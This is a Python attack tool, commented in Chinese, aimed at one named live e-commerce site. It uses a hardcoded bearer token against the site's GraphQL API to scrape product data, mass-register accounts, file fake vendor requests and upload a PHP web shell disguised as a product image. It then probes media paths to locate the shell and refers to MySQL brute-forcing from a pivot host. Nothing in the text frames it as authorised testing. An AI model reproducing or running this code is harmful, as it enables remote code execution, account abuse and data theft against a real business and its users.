#!/usr/bin/env python3
"""
完整自动化渗透工具 - 9to9.co.id
持续测试所有可能的攻击向量
"""

import requests
import json
import time
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

class Color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

class Exploit:
    def __init__(self):
        self.graphql_url = "https://oms.9to9.co.id/graphql"
        self.session = requests.Session()
        self.session.verify = False
        self.token = "lu428yeg56c6r5ax1v3h522kuwict1kg"
        
    def log(self, msg, level="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == "success":
            print(f"{Color.GREEN}[+] {timestamp} {msg}{Color.END}")
        elif level == "error":
            print(f"{Color.RED}[-] {timestamp} {msg}{Color.END}")
        elif level == "warning":
            print(f"{Color.YELLOW}[!] {timestamp} {msg}{Color.END}")
        else:
            print(f"{Color.BLUE}[*] {timestamp} {msg}{Color.END}")
    
    def graphql_query(self, query, use_token=False):
        headers = {"Content-Type": "application/json"}
        if use_token:
            headers["Authorization"] = f"Bearer {self.token}"
        
        try:
            r = self.session.post(
                self.graphql_url,
                json={"query": query},
                headers=headers,
                timeout=10
            )
            return r.json()
        except Exception as e:
            self.log(f"GraphQL错误: {e}", "error")
            return None
    
    def register_customer(self, email=None):
        if not email:
            email = f"auto{int(time.time())}@test.com"
        
        query = f"""
        mutation {{
            createCustomer(input: {{
                email: "{email}",
                firstname: "Auto",
                lastname: "Test",
                password: "Test@123"
            }}) {{
                customer {{
                    email
                }}
            }}
        }}
        """
        
        result = self.graphql_query(query)
        if result and 'data' in result and result['data'].get('createCustomer'):
            self.log(f"注册成功: {email}", "success")
            return email
        else:
            self.log(f"注册失败: {result}", "error")
            return None
    
    def enum_products(self, limit=100):
        query = f"""
        {{
            products(search: "", pageSize: {limit}) {{
                items {{
                    sku
                    name
                    price {{
                        regularPrice {{
                            amount {{
                                value
                                currency
                            }}
                        }}
                    }}
                }}
                total_count
            }}
        }}
        """
        
        result = self.graphql_query(query)
        if result and 'data' in result:
            products = result['data']['products']['items']
            total = result['data']['products']['total_count']
            self.log(f"枚举到 {len(products)} / {total} 个产品", "success")
            
            with open('products_data.json', 'w') as f:
                json.dump(products, f, indent=2)
            
            return products
        return []
    
    def submit_vendor_request(self, email=None):
        if not email:
            email = f"vendor{int(time.time())}@test.com"
        
        query = f"""
        mutation {{
            addNewVendorRequest(input: {{
                email: "{email}",
                first_name: "Test",
                last_name: "Vendor",
                password: "Test@123",
                password_confirmation: "Test@123",
                company_name: "AutoTest Inc"
            }}) {{
                status
            }}
        }}
        """
        
        result = self.graphql_query(query)
        if result and 'data' in result:
            self.log(f"Vendor申请已提交: {email}", "success")
            return True
        return False
    
    def test_upload(self, filename="test.php", content=None):
        if not content:
            content = '<?php system($_GET["c"]); ?>'
        
        import base64
        content_b64 = base64.b64encode(content.encode()).decode()
        
        query = f"""
        mutation {{
            vendorProductImageUpload(binary: "{content_b64}") {{
                status_cpi
                message_cpi
            }}
        }}
        """
        
        result = self.graphql_query(query, use_token=True)
        if result and 'data' in result:
            upload_result = result['data'].get('vendorProductImageUpload', {})
            if upload_result.get('status_cpi') == 'success':
                self.log(f"上传成功: {filename}", "success")
                self.log("尝试常见路径...", "info")
                
                # 尝试常见路径
                paths = [
                    f"/pub/media/marketplace/{filename}",
                    f"/pub/media/vendor/product/{filename}",
                    f"/pub/media/tmp/{filename}",
                    f"/media/marketplace/{filename}",
                    f"/var/import/{filename}"
                ]
                
                for path in paths:
                    full_url = f"https://oms.9to9.co.id{path}"
                    try:
                        r = requests.get(full_url, timeout=5, verify=False)
                        if r.status_code == 200 and '<?php' not in r.text:
                            self.log(f"找到文件! {full_url}", "success")
                            return full_url
                    except:
                        pass
                
                self.log("未找到文件路径", "warning")
                return True
        return False
    
    def brute_mysql(self, passwords_file="/tmp/mysql_passwords.txt"):
        self.log("MySQL暴力破解需要从pivot主机执行", "warning")
        self.log("请使用 mysql_crack.sh 脚本", "info")
    
    def batch_register(self, count=10):
        self.log(f"批量注册 {count} 个账号", "info")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for i in range(count):
                email = f"batch{int(time.time())}_{i}@test.com"
                futures.append(executor.submit(self.register_customer, email))
                time.sleep(0.1)
            
            results = [f.result() for f in futures]
            success = len([r for r in results if r])
            self.log(f"成功注册 {success}/{count} 个账号", "success")
    
    def auto_exploit(self):
        self.log("开始自动化渗透测试", "info")
        
        # 1. 枚举产品
        self.log("Step 1: 枚举产品数据", "info")
        self.enum_products()
        time.sleep(1)
        
        # 2. 注册账号
        self.log("Step 2: 注册测试账号", "info")
        self.register_customer()
        time.sleep(1)
        
        # 3. 提交vendor申请
        self.log("Step 3: 提交Vendor申请", "info")
        self.submit_vendor_request()
        time.sleep(1)
        
        # 4. 测试上传
        self.log("Step 4: 测试文件上传", "info")
        self.test_upload()
        
        self.log("自动化测试完成", "success")
    
    def show_menu(self):
        print("\n" + "="*50)
        print("  自动化渗透工具 - 9to9.co.id")
        print("="*50)
        print("1. 注册Customer账号")
        print("2. 批量注册账号")
        print("3. 枚举产品数据")
        print("4. 提交Vendor申请")
        print("5. 测试文件上传")
        print("6. 自动化执行全部")
        print("7. MySQL暴力破解（需pivot）")
        print("0. 退出")
        print("="*50)
        
        choice = input("\n选择 [0-7]: ").strip()
        return choice
    
    def run(self):
        print(f"{Color.BLUE}")
        print("╔═══════════════════════════════════════╗")
        print("║  Auto Exploitation Tool v1.0         ║")
        print("║  Target: oms.9to9.co.id              ║")
        print("╚═══════════════════════════════════════╝")
        print(f"{Color.END}")
        
        while True:
            try:
                choice = self.show_menu()
                
                if choice == '1':
                    self.register_customer()
                elif choice == '2':
                    count = int(input("数量 (1-100): "))
                    self.batch_register(count)
                elif choice == '3':
                    self.enum_products()
                elif choice == '4':
                    self.submit_vendor_request()
                elif choice == '5':
                    self.test_upload()
                elif choice == '6':
                    self.auto_exploit()
                elif choice == '7':
                    self.brute_mysql()
                elif choice == '0':
                    self.log("退出", "info")
                    break
                else:
                    self.log("无效选择", "error")
                
                time.sleep(0.5)
                
            except KeyboardInterrupt:
                print("\n")
                self.log("用户中断", "warning")
                break
            except Exception as e:
                self.log(f"错误: {e}", "error")

if __name__ == "__main__":
    exploit = Exploit()
    exploit.run()
